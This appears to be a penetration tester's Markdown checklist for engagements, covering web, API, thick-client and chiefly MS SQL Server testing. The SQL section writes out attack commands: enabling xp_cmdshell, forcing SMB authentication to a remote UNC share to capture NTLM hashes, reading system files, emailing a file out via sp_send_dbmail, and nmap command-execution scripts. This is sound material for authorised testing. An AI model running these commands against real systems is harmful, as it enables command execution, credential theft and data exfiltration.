#### Admin
- [ ] move cards
- [ ] create dirs in artifact folder
- [ ] setup obsidian notes
- [ ] check previous years tests
- [ ] verify scope
- [ ] setup burp/SOAPUi/Postman/Etc
	- [ ] set scope
- [ ] enable logging
- [ ] Setup Dradis Project

### Generic
- [ ] Attempt to use discovered credentials
	- [ ] valid account allows access
	- [ ] what level of access? admin?
- [ ] Injection
- [ ] PII/PHI/PFI/CCN
- [ ] Timeout
- [ ] Log file on hosts
- [ ] Run scripts on hosts
- [ ] Source Code
- [ ] NMAP
- [ ] Wireshark
- [ ] Check system scheduled tasks or cron jobs
- [ ] 

#### Testing Web App
- [ ] SSL
	- [ ] SSL/TLS Client-Initiated Renegotiation [DID-0204
- [ ] Headers
- [ ] Burp scan
- [ ] SQLMap
- [ ] XSS
	- [ ] XSS strike
	- [ ] Brute XSS
	- [ ] XSSer
- [ ] User enumeration
	- [ ] invalid logins
	- [ ] reset login/password

#### Testing API App
- [ ] SSL
	- [ ] SSL/TLS Client-Initiated Renegotiation [DID-0204
- [ ] Headers
- [ ] Burp scan
- [ ] SQLMap
- [ ] NMAP
- [ ] XSS


#### Testing Thick Client
- [ ] DLLs
- [ ] Loading EXEs
- [ ] Unquoted services
- [ ] Unsigned
- [ ] Registry Changes



####  Testing SQL
- [ ] Run
	- [ ] `SQL Low Hanging Fruit.sql`
	- [ ] `nmap -Pn -sV -sC -p1433 {SERVERNAME OR IP}`
	- [ ] `nmap -p 1433 --script ms-sql-empty-password <target-ip>`
	- [ ] `nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username={USERNAME}},mssql.password=<password>,ms-sql-xp-cmdshell.cmd="whoami" <target-ip>`
- [ ] Check encryption
	```SQL
	SELECT session_id, net_transport, protocol_type, auth_scheme, encrypt_option FROM SYS.DM_EXEC_CONNECTIONS
	```
- [ ] Check for command execution
	```SQL
	--To allow advanced options to be changed.  
	EXECUTE sp_configure 'show advanced options', 1
	GO
	--To update the currently configured value for advanced options.  
	RECONFIGURE
	GO  
	--To enable the feature.  
	EXECUTE sp_configure 'xp_cmdshell', 1
	GO  
	--To update the currently configured value for this feature.  
	RECONFIGURE
	GO
	--Test command execution
	xp_cmdshell 'whoami'
	GO
	```
- [ ] Check for file read/write
	- [ ]  **xp_dirtee** Run wireshark on UNC target to capture SMB
    ```SQL
    EXEC master..xp_dirtree '\\10.188.145.219\tools$'
    GO
    ```
	- [ ] **xp_subdirs** Run wireshark on UNC target to capture SMB
    ```SQL
    EXEC master..xp_subdirs '\\10.188.145.219\tools$'
    GO
    ```
	- [ ] using creds
		```sql
		EXEC sp_addlinkedserver
		    @server = 'RemoteShare', 
		    @srvproduct = '', 
		    @provider = 'Microsoft.Jet.OLEDB.4.0', 
		    @datasrc = '\\IPADDY\temp';
		
		EXEC sp_addlinkedsrvlogin 
		    @rmtsrvname = 'RemoteShare', 
		    @useself = 'false', 
		    @rmtuser = '{USERNAME}', 
		    @rmtpassword = 'password';
		```

	- [ ] How to check for existing file
		```sql
		DECLARE @FileExists TABLE (
		    subdirectory NVARCHAR(255),
		    depth INT,
		    isFile BIT
		);
		
		INSERT INTO @FileExists
		EXEC master.sys.xp_dirtree 'C:\Windows\System32\drivers\etc', 1, 1;
		
		SELECT * FROM @FileExists WHERE subdirectory = 'hosts';
		```
	- [ ] **read file**
		```SQL
		SELECT * FROM OPENROWSET(BULK N'C:\windows\system32\drivers\etc\hosts', SINGLE_CLOB) AS Contents
		GO
		```
		```SQL
		DECLARE @FileContents VARCHAR(MAX);
		DECLARE @OLE INT;
		DECLARE @FileID INT;
		EXEC sp_OACreate 'Scripting.FileSystemObject', @OLE OUT;
		EXEC sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'C:\path\to\your\file.txt', 1;
		EXEC sp_OAMethod @FileID, 'ReadAll', @FileContents OUT;
		EXEC sp_OADestroy @FileID;
		EXEC sp_OADestroy @OLE;
		SELECT @FileContents AS FileContents;
		```
		```SQL
		BULK INSERT YourTable
		FROM 'C:\windows\system32\drivers\etc\hosts'
		WITH (
		    FIELDTERMINATOR = ',',
		    ROWTERMINATOR = '\n'
			);
		```

- [ ] Check for hash stealing
	- user dirtree/subdir against wireshark
	- use NTLMRawUnHide.py against pcap
- [ ] Check for email
	- [ ] is email enabled
		```SQL
		SELECT name, value, value_in_use, description
		FROM sys.configurations
		WHERE name = 'Database Mail XPs';
		```
	- [ ] is email granted to public
		```
		USE msdb;
		SELECT 
		    dp.name AS PrincipalName,
		    dp.type_desc AS PrincipalType,
		    o.name AS ObjectName,
		    p.permission_name AS PermissionName,
		    p.state_desc AS PermissionState
		FROM 
		    sys.database_permissions p
		JOIN 
		    sys.database_principals dp ON p.grantee_principal_id = dp.principal_id
		LEFT JOIN 
		    sys.objects o ON p.major_id = o.object_id
		WHERE 
		    dp.name = 'public' AND p.permission_name = 'EXECUTE' AND o.name = 'sp_send_dbmail';
		```

	- [ ] send email 
		```SQL
		--EXEC msdb.dbo.sysmail_help_status_sp
		--EXEC sysmail_help_profile_sp
		EXEC msdb.dbo.sp_send_dbmail
		@recipients = '{EMAIL}',
		@subject = 'Test Email',
		@body = 'This is a test email sent from SQL Server.',
		@body_format = 'HTML',  -- You can use 'TEXT' for plain text emails
		@file_attachments='C:\windows\system32\drivers\etc\hosts';
		```
- [ ] Check for registry read
	```SQL
	EXECUTE master.sys.xp_instance_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\MSSQLServer\MSSQLServer\CurrentVersion', 'CurrentVersion';
	```
- [ ] Check for registry read is implicit  public
```
-- 1. Show your login and server roles
SELECT SUSER_NAME() AS CurrentLogin;
SELECT 
    sp.name AS LoginName,
    spr.name AS ServerRole
FROM sys.server_principals sp
JOIN sys.server_role_members srm ON sp.principal_id = srm.member_principal_id
JOIN sys.server_principals spr ON srm.role_principal_id = spr.principal_id
WHERE sp.name = SUSER_NAME();

-- 2. Show explicit permissions for your login
SELECT 
    sp.name AS PrincipalName,
    perm.permission_name,
    perm.state_desc,
    obj.name AS ObjectName
FROM sys.server_permissions AS perm
JOIN sys.server_principals AS sp ON perm.grantee_principal_id = sp.principal_id
LEFT JOIN sys.all_objects AS obj ON perm.major_id = obj.object_id
WHERE sp.name = SUSER_NAME();

-- 3. Check CONTROL SERVER
SELECT HAS_PERMS_BY_NAME(NULL, NULL, 'CONTROL SERVER') AS HasControlServer;

-- 4. Check EXECUTE on xp_instance_regread
SELECT HAS_PERMS_BY_NAME('xp_instance_regread', 'OBJECT', 'EXECUTE') AS CanExecuteProc;
```
- [ ] Check for registry read is grant  public
```
USE master;
GO

SELECT
    pr.name AS PrincipalName,
    pr.type_desc AS PrincipalType,
    pe.permission_name AS PermissionName,
    pe.state_desc AS PermissionState
FROM
    sys.database_permissions AS pe
JOIN
    sys.all_objects AS ob ON pe.major_id = ob.object_id
JOIN
    sys.database_principals AS pr ON pe.grantee_principal_id = pr.principal_id
WHERE
    ob.name = 'xp_instance_regread' AND ob.schema_id = SCHEMA_ID('sys');
```
- [ ] Check for VIEW SERVER STATE
	```sql
	USE msdb;
	SELECT 
		dp.name AS PrincipalName,
		dp.type_desc AS PrincipalType,
		o.name AS ObjectName,
		p.permission_name AS PermissionName,
		p.state_desc AS PermissionState
	FROM 
		sys.database_permissions p
	JOIN 
		sys.database_principals dp ON p.grantee_principal_id = dp.principal_id
	LEFT JOIN 
		sys.objects o ON p.major_id = o.object_id
	WHERE 
		dp.name = 'public' AND p.permission_name = 'EXECUTE' AND o.name = 'VIEW SERVER STATE';
	```


